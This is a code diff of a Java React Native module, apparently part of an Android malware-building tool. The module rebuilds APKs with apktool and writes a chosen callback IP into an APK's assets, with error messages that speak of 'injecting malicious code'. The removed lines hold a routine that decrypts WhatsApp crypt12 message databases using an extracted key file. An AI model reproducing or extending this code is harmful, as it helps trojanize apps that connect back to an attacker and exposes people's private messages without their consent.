@@ -12,7 +12,6 @@ import androidx.annotation.RequiresApi;
 
 import com.android.apksigner.ApkSignerTool;
 import com.facebook.react.bridge.Arguments;
-import com.facebook.react.bridge.Callback;
 import com.facebook.react.bridge.Promise;
 import com.facebook.react.bridge.ReactApplicationContext;
 import com.facebook.react.bridge.ReactContextBaseJavaModule;
@@ -21,15 +20,11 @@ import com.facebook.react.bridge.WritableArray;
 import com.facebook.react.bridge.WritableMap;
 import com.facebook.react.bridge.WritableNativeArray;
 import com.facebook.react.bridge.WritableNativeMap;
-import com.facebook.react.modules.core.DeviceEventManagerModule;
 
 import net.dongliu.apk.parser.ApkFile;
 
 import org.apache.commons.io.FileUtils;
 import org.jetbrains.annotations.NotNull;
-import org.json.JSONArray;
-import org.json.JSONException;
-import org.json.JSONObject;
 import org.xmlpull.v1.XmlPullParser;
 import org.xmlpull.v1.XmlPullParserException;
 import org.xmlpull.v1.XmlPullParserFactory;
@@ -45,37 +40,15 @@ import java.io.FileWriter;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
-import java.io.RandomAccessFile;
 import java.io.StringReader;
-import java.io.UnsupportedEncodingException;
-import java.security.InvalidAlgorithmParameterException;
-import java.security.InvalidKeyException;
-import java.security.NoSuchAlgorithmException;
-import java.security.NoSuchProviderException;
-import java.security.Security;
 import java.util.ArrayList;
-import java.util.Arrays;
 import java.util.List;
 import java.util.regex.Pattern;
-import java.util.zip.DataFormatException;
-import java.util.zip.Inflater;
-import java.util.zip.InflaterInputStream;
 import java.util.zip.ZipEntry;
 import java.util.zip.ZipInputStream;
 import java.util.zip.ZipOutputStream;
 
-import javax.crypto.BadPaddingException;
-import javax.crypto.Cipher;
-import javax.crypto.CipherInputStream;
-import javax.crypto.IllegalBlockSizeException;
-import javax.crypto.NoSuchPaddingException;
-import javax.crypto.ShortBufferException;
-import javax.crypto.spec.GCMParameterSpec;
-import javax.crypto.spec.IvParameterSpec;
-import javax.crypto.spec.SecretKeySpec;
-
 import brut.apktool.Main;
-import org.spongycastle.jce.provider.BouncyCastleProvider; // Android
 
 public class AppBuilderModule extends ReactContextBaseJavaModule {
     private final ReactApplicationContext reactContext;
@@ -86,103 +59,11 @@ public class AppBuilderModule extends ReactContextBaseJavaModule {
         super(context);
         this.reactContext = context;
     }
-    static {
-        Security.insertProviderAt(new org.spongycastle.jce.provider.BouncyCastleProvider(), 1);
-    }
 
     @NotNull
     @Override
     public String getName() {
         return "AppBuilder";
-    }
-    @ReactMethod
-    public void decrypt(String C12File,String KeyFile,Promise promise){
-        WritableMap params = Arguments.createMap();
-        params.putString("message", "[+] Decription Success!");
-        try{
-            String decryptedDbFile = Environment.getExternalStorageDirectory().getPath()+"/msgstore.db";         // sqlite3 db output file
-            final File tempFile = new File(System.getProperty("java.io.tmpdir") + "/"
-                    + (int) (System.currentTimeMillis() / 1000L) + "-msgstore.enc");
-
-            if (!new File(KeyFile).isFile())
-                promise.reject("e","The specified input key file does not exist.");
-
-            else if (new File(KeyFile).length() != 158)
-                promise.reject("e","The specified input key file is invalid.");
-
-            else if (!new File(C12File).isFile())
-                promise.reject("e","The specified input crypt12 file does not exist.");
-
-            InputStream KeyIn = new FileInputStream(KeyFile);
-            InputStream WdbIn = new BufferedInputStream(new FileInputStream(C12File));
-
-            byte[] KeyData = new byte[158];
-            KeyIn.read(KeyData);
-            byte[] T1 = new byte[32];
-            System.arraycopy(KeyData, 30, T1, 0, 32);
-            byte[] KEY = new byte[32];
-            System.arraycopy(KeyData, 126, KEY, 0, 32);
-            KeyIn.close();
-
-            byte[] C12Data = new byte[190];
-            WdbIn.read(C12Data);
-            byte[] T2 = new byte[32];
-            System.arraycopy(C12Data, 3, T2, 0, 32);
-            byte[] IV = new byte[16];
-            System.arraycopy(C12Data, 67, IV, 0, 16);
-            if (!new String(T1, 0, T1.length, "ASCII").equals(new String(T2, 0, T2.length, "ASCII")))
-                promise.reject("e","Key file mismatch or crypt12 file is corrupt.");
-
-            int InputLength = WdbIn.available();
-            RandomAccessFile raf = new RandomAccessFile(tempFile, "rw");
-
-            byte[] tempBuffer = new byte[1024];
-            int I;
-            while ((I = WdbIn.read(tempBuffer)) != -1)
-                raf.write(tempBuffer, 0, I);
-            raf.setLength(InputLength);
-            raf.close();
-            WdbIn.close();
-
-            InputStream PdbSt = new BufferedInputStream(new FileInputStream(tempFile));
-
-            Cipher cipher;
-            Security.addProvider(new BouncyCastleProvider());
-            cipher = Cipher.getInstance("AES/GCM/NoPadding", "SC"); // SpongyCastle (Android)
-
-            cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(KEY, "AES"), new IvParameterSpec(IV));
-            CipherInputStream CipherStream = new CipherInputStream(PdbSt, cipher);
-
-            InflaterInputStream CryptOutput = new InflaterInputStream(CipherStream, new Inflater(false));
-
-            try {
-                FileOutputStream InflateBuffer = new FileOutputStream(decryptedDbFile);
-                int N = 0;
-                byte[] CryptBuffer = new byte[8192];
-                while ((N = CryptOutput.read(CryptBuffer)) != -1) {
-                    InflateBuffer.write(CryptBuffer, 0, N);
-                }
-                InflateBuffer.close();
-
-            } catch (IOException e) {
-                e.printStackTrace();
-            }
-
-            tempFile.delete();
-
-            InputStream SqlDB = new FileInputStream(decryptedDbFile);
-
-            byte[] SqlData = new byte[6];
-            SqlDB.read(SqlData);
-            byte[] MS = new byte[6];
-            System.arraycopy(SqlData, 0, MS, 0, 6);
-            SqlDB.close();
-            promise.resolve(params);
-
-        } catch (SecurityException | NoSuchProviderException | IOException | NoSuchAlgorithmException | NoSuchPaddingException | InvalidAlgorithmParameterException | InvalidKeyException e){
-            e.printStackTrace();
-            promise.reject("e","[!] Decryption Failed!");
-        }
     }
     @ReactMethod
     public void readDB(String path, String query, Promise promise){
@@ -286,12 +167,24 @@ public class AppBuilderModule extends ReactContextBaseJavaModule {
         try {
             fr = new FileReader(file);
             BufferedReader br = new BufferedReader(fr);
-            FileWriter fw=new FileWriter(working_dir+"normal_apk/assets/ip.txt");
-            while((line=br.readLine()) != null){
-                fw.write(line.replaceAll("192.168.43.1",ip));
-            }//loop
-            fw.close();
-            promise.resolve(params);
+            if(new File(working_dir+"normal_apk/assets").exists()) {
+                FileWriter fw=new FileWriter(working_dir+"normal_apk/assets/ip.txt");
+                while((line=br.readLine()) != null){
+                    fw.write(line.replaceAll("192.168.43.1",ip));
+                }//loop
+                fw.close();
+                promise.resolve(params);
+            }else if(new File(working_dir+"normal_apk/assets").mkdirs()) {
+                FileWriter fw=new FileWriter(working_dir+"normal_apk/assets/ip.txt");
+                while((line=br.readLine()) != null){
+                    fw.write(line.replaceAll("192.168.43.1",ip));
+                }//loop
+                fw.close();
+                promise.resolve(params);
+            }else{
+                promise.reject("e","[!] Injecting malicious code Failed! Due to assets");
+            }
+
         } catch ( IOException e) {
             e.printStackTrace();
             promise.reject("e","[!] Injecting malicious code Failed!");
